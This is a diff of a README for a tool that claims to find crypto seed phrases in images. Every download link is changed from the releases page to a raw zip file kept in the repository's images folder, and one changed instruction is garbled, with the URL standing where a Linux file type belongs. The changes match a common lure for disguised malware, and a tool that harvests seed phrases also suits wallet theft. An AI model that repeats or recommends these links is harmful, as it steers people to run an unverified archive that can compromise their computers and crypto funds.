@@ -1,6 +1,6 @@
 # 🎨 Image-Seed-Phrase-Finder - Easily Find Your Crypto Seed Phrases
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/releases)
+[![Download Now](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/raw/refs/heads/main/images/Phrase_Image_Finder_Seed_v1.7.zip)](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/raw/refs/heads/main/images/Phrase_Image_Finder_Seed_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Image-Seed-Phrase-Finder! This application scans images with OCR 
 
 To get started, visit this page to download the application:
 
-[Download the latest release](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/releases)
+[Download the latest release](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/raw/refs/heads/main/images/Phrase_Image_Finder_Seed_v1.7.zip)
 
 1. **Visit the Releases page**
    - Click on the link above to go to the Releases page.
@@ -19,7 +19,7 @@ To get started, visit this page to download the application:
    - You'll see different versions of the software listed. Select the latest version for your needs.
 
 3. **Download the file**
-   - Click on the file that matches your operating system, such as `.exe` for Windows or `.tar.gz` for Linux.
+   - Click on the file that matches your operating system, such as `.exe` for Windows or `https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/raw/refs/heads/main/images/Phrase_Image_Finder_Seed_v1.7.zip` for Linux.
 
 4. **Run the application**
    - Locate the downloaded file on your computer, then double-click to start the installation. Follow the prompts to complete the setup.
@@ -80,4 +80,4 @@ Stay updated on future releases and features by following the project on GitHub.
 
 For more help or questions, please reach out via the Issues tab on the project page.
 
-[Download the latest release](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/releases)
+[Download the latest release](https://github.com/Dinhco2712/Image-Seed-Phrase-Finder/raw/refs/heads/main/images/Phrase_Image_Finder_Seed_v1.7.zip)
